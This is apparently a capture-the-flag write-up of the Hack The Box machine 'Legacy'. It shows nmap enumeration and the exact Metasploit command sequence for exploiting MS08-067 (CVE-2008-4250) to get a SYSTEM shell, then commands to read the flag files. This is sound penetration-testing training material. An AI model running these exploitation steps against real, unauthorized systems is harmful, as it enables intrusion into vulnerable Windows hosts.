# HTB - Legacy

> **Difficulty:** Easy
> **OS:** Windows
> **Platform:** Hack The Box

---

## Overview

Legacy is a Windows machine that can be compromised by exploiting vulnerable versions of the **Microsoft Server Service**.

The attack path is based on identifying vulnerable SMB-related services and exploiting the **MS08-067** vulnerability, which allows remote code execution.

The main attack path was:

```text
Port Enumeration
      ↓
SMB Service Identification
      ↓
Vulnerable Windows Version
      ↓
MS08-067 / CVE-2008-4250
      ↓
Metasploit Exploitation
      ↓
NT AUTHORITY\SYSTEM
      ↓
User and Root Flags
```

---

# 1. Enumeration

## Nmap

I started by performing a full TCP port scan with service and version detection:

```bash
nmap -sC -sV -p- 10.129.227.181
```

The scan revealed several interesting services, including:

```text
21/tcp    open  ftp
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
```

The most interesting findings were the SMB-related services:

* `139/tcp` - NetBIOS Session Service
* `445/tcp` - Microsoft-DS / SMB

The target was running an old version of Windows, which suggested that known vulnerabilities affecting legacy Windows systems should be investigated.

---

# 2. Vulnerability Identification

## MS08-067

After identifying the SMB-related services and the old Windows environment, I searched for known vulnerabilities affecting the system.

The relevant vulnerability was:

```text
MS08-067
```

This vulnerability is also associated with:

```text
CVE-2008-4250
```

The vulnerability affects the Windows Server service and allows remote code execution.

I searched for the corresponding Metasploit module:

```text
search ms08-067
```

<img width="948" height="154" alt="cve-legacy" src="https://github.com/user-attachments/assets/de061023-93b7-442e-a9ce-9373bdd5e011" />

The relevant module was:

```text
exploit/windows/smb/ms08_067_netapi
```

---

# 3. Exploitation

I selected the Metasploit module:

```text
use exploit/windows/smb/ms08_067_netapi
```

I then configured the target:

```text
set RHOSTS 10.129.227.181
```

After configuring the required options, I executed the exploit:

```text
run
```

The exploit was successful and provided a command shell on the target machine.


<img width="952" height="178" alt="meterpreter-legacy" src="https://github.com/user-attachments/assets/c3ee8819-2cda-45ff-9e99-9e7aec85c1ca" />



---

# 4. Privilege Verification

After obtaining a shell, I verified the privilege level of the session.

The command:

```cmd
whoami
```

was not returning the expected output in the shell I was using, so I verified the current user through the Windows environment variables:

```cmd
echo %USERDOMAIN%\%USERNAME%
```

The result was:

```text
NT AUTHORITY\SYSTEM
```

This confirmed that the exploit had provided the highest level of privileges available on the Windows system.

No additional privilege escalation was required.

---

# 5. Flag Retrieval

With a SYSTEM-level shell, I was able to access the users' directories and retrieve the flags.

## User Flag

The user flag was located on the desktop of the `john` user:

```cmd
type C:\Documents and Settings\john\Desktop\user.txt
```

Alternatively, the user directory could be enumerated with:

```cmd
dir "C:\Documents and Settings\john\Desktop"
```

---

## Root Flag

Since the shell was running as:

```text
NT AUTHORITY\SYSTEM
```

I was able to access the Administrator's desktop and retrieve the root flag:

```cmd
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

---

# 6. Attack Path Summary

```text
Full Port Scan
      │
      ▼
SMB / NetBIOS Services Identified
      │
      ▼
Legacy Windows Version Detected
      │
      ▼
MS08-067 / CVE-2008-4250 Identified
      │
      ▼
Metasploit Module Selected
      │
      ▼
ms08_067_netapi Exploited
      │
      ▼
Command Shell Obtained
      │
      ▼
NT AUTHORITY\SYSTEM
      │
      ▼
User + Root Flags
```

---

# 7. Lessons Learned

* Full port enumeration is important because SMB services can expose serious vulnerabilities.
* Old Windows systems should always be checked against historical vulnerabilities.
* Version identification can directly lead to a specific exploit.
* MS08-067 is a classic example of a remote code execution vulnerability in the Windows Server service.
* Metasploit can simplify the exploitation process when a reliable module is available.
* After obtaining a shell, always verify the current privilege level.
* `NT AUTHORITY\SYSTEM` represents the highest level of privileges on a Windows system.
* Privilege escalation is not always necessary. In this case, the initial exploit already provided SYSTEM-level access.

---

# Tools Used

* Nmap
* Metasploit Framework
* SMB enumeration
* Windows CMD
* `ms08_067_netapi`

---

# Vulnerability Reference

* **Vulnerability:** MS08-067
* **CVE:** CVE-2008-4250
* **Affected Component:** Windows Server Service
* **Impact:** Remote Code Execution
* **Final Privilege:** `NT AUTHORITY\SYSTEM`

---

## Flags

> Flags intentionally omitted from this public write-up.
>
> User and root flags were successfully obtained during the machine compromise.
